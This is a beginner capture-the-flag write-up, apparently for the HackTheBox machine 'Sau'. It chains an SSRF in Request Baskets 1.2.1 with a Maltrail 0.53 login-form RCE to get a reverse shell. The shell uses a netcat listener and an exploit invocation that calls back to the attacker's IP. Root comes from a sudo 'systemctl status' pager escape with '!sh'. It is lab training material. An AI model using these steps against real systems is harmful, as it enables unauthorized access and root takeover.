## Introduction

This machine is designed for beginners to test their skills in CTFs. It covers topics such as version exploitation, SSRF, RCE, and sudo. 

## Initial Recon

Our objective in the initial recon is to determine: 
1. Open ports
2. Services running on these ports, 
3. The version of the services running, and 
4. If these versions are exploitable.


Starting with a quick `nmap` scan.
```
nmap  <target-ip>
```

Result:
```
Nmap scan report for 10.10.11.224
Host is up (0.089s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    filtered http
55555/tcp open     unknown

# Nmap done at Fri Nov 24 09:21:45 2023 -- 1 IP address (1 host up) scanned in 4.85 seconds

```

From this scan, we can see that there are three open ports on the machine. Two of them are running web services, while the other one is running SSH. 

It would be great to run a version and services scan now.

```
nmap -A <target-ip>
```

You can refer to the `nmap` manual for details about the tags.

Result: 
```
Nmap scan report for 10.10.11.224
Host is up (0.088s latency).

PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
80/tcp    filtered http
55555/tcp open     unknown
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Fri, 24 Nov 2023 03:53:30 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Fri, 24 Nov 2023 03:53:03 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Fri, 24 Nov 2023 03:53:03 GMT
|_    Content-Length: 0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


From this scan, we can confirm our assumption that there is a web application running on port `55555`. However, port `80` remains filtered, and the scan cannot provide any information about it, indicating that this port is only accessible to specific IP addresses or localhost.

Now we have a foundation to work from to determine which service is running on port `55555`.

## Web Enumeration Port 55555

When we visit the web URL `http://<target-ip>:55555`, it redirects us to `/web`, which is running Requests Baskets. I don't have much knowledge about Request Baskets, so I quickly searched for information online. You can read about this service on [Requests-Baskets](https://github.com/darklynx/request-baskets).

`http://<target-ip>:55555/web`

![Pasted image 20231125172813](https://github.com/Itskmishra/hackthebox-writeups/assets/141756495/b8dd35e4-fe9d-4c05-aa41-9072b331c5b7)

Now, having read about the service, we have version information at the bottom. It is running Requests-Baskets version 1.2.1. 

![Pasted image 20231125173120](https://github.com/Itskmishra/hackthebox-writeups/assets/141756495/1495fb92-2767-44ce-b5e7-40831812fa23)


I quickly searched for more information and discovered that this version of the application is vulnerable to server-side request forgery. If this is possible, we can check the internal application running on port 80.But before anything let's explore the application well so we have good understanding how it is working.

> How this application works.
>
> This is an application that creates a basket to store all incoming requests. You can perform various actions, such as responding to them or forwarding them to another location.


After exploring this application, I have discovered a potential vulnerability to SSRF. There are two methods of exploiting this vulnerability, both of which are correct and effective. I will demonstrate both methods below.

## Exploiting the SSRF (port 55555)
### Method 1:
There is a forwarding URL option available after creating a basket, which leads to an internal web application.
#### Step 1:
Create a basket using the "Create" button on the application.
#### Step 2:
Go to the port forwarding option and enter `http://127.0.0.1:80`. Check the proxy response to `true`.
![Pasted image 20231125175159](https://github.com/Itskmishra/hackthebox-writeups/assets/141756495/e341342b-8ffe-4acf-b540-29d819dcd623)

#### Step 3:
Request the basket URL from another tab using the basket link provided. And it will forward to the internal web application.

![Pasted image 20231125175254](https://github.com/Itskmishra/hackthebox-writeups/assets/141756495/3af8f391-396c-47dc-b6c4-83971f69baaa)


### Method 2:
You can use a script developed by [entr0pie](https://github.com/entr0pie/CVE-2023-27163) to exploit the vulnerability.

> How does the script work?
> 
> This script automates the steps that you were performing manually in the previous method. It takes two parameters, the basket URL and the URL you want to visit. It creates a basket and sets up a forwarding URL as provided by you.

Simply copy/download the script to the attacker machine and execute it as demonstrated on the GitHub page.

```
bash exploit.sh http://<target-ip>:55555 http://127.0.0.1:80
```


After running this command you will get basket url in the results which you can use in the browser. By using both ways, we will achieve the same end result.

Upon visiting the basket url it redirects to another application, the webpage is not flashy. If it only has a few pieces of information on the page, such as three URLs and the services it is running (Maltrail version 0.53), we can search online to determine what is maltrail and if there are any vulnerabilities in this version


Once again, we have discovered a remote code execution vulnerability in this version which can be exploited. 
## Exploiting the RCE (port 80)

> How does this exploit work?
> 
> This vulnerability allows us to inject malicious code into the login page form, which can lead to obtaining the reverse shell.

Exploiting this vulnerability is very easy. You just need to download the [script](https://github.com/spookier/Maltrail-v0.53-Exploit) and run the exploit on the login page of Maltrail. However, there is one major question: we are unable to change the paths of the application running internally. Therefore, we need to change the forwarding route from `http://127.0.0.1:80` to `http://127.0.0.1:80/login`. 

Now we can launch our exploit. Start a netcat listener on your attacker machine.

```
nc -nlvp <port>
```

Exploit:
```
python3 exploit.py [your_ip] [netcat_port] [Basket_url_of_the_login_page]
```

After running the exploit, you can obtain a shell. Once you have successfully done so, you may use your preferred method to stabilize the shell.

We can see that got a shell as puma which is the only user on the machine. Now we can read the user flag at `/home/puma/user.txt` .


## Privilege Escalation

We now have a shell, so let's start by enumerating the files in Puma's home directory. There was nothing interesting in the user's home directory. After searching for a while, we found something interesting with the SUID permissions.

```
sudo -l
```

Result:
```
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

 we can execute `systemctl` as root to check the status of `trail.service`. Let's executed the command and see.

```
sudo /usr/bin/systemctl status trail.service
```
  
We executed the command and saw that it checked the status and printed a lot on the screen.

Searched for privilege escalation methods with `systemctl` and found a way to escalate privileges with `systemctl` on [GTFobins](https://gtfobins.github.io/gtfobins/systemctl/) website. According to this, we can exploit `less` opened by the `systemctl` command to print logs with a simple `!sh`. Because we are running this command as root, `less` is also called with root, which can be confirmed with any process monitor like `pspy` and others. 

Test this by executing the command:

```
sudo /usr/bin/systemctl status trail.service
```

then type `!sh` with your keyboard and hit enter:
```
!sh
```

Yay, we got the shell as root. You can confirm this using the `id` or `whoami` command. Now you can read the root flag.an confirm this using `id` or `whoami` command. Now you can read the root flag.


## Conclusion

I understand this may seem too fast, but there isn't much about this machine that requires explanation. Just remember that you don't need to doubt your skills. After learning different concepts and doing some CTFs, you will start picking up things on your own. Don't forget to double-check every possible aspect, such as version, vulnerabilities, and more. I wish you luck for the future.


HAPPY HACKING :)
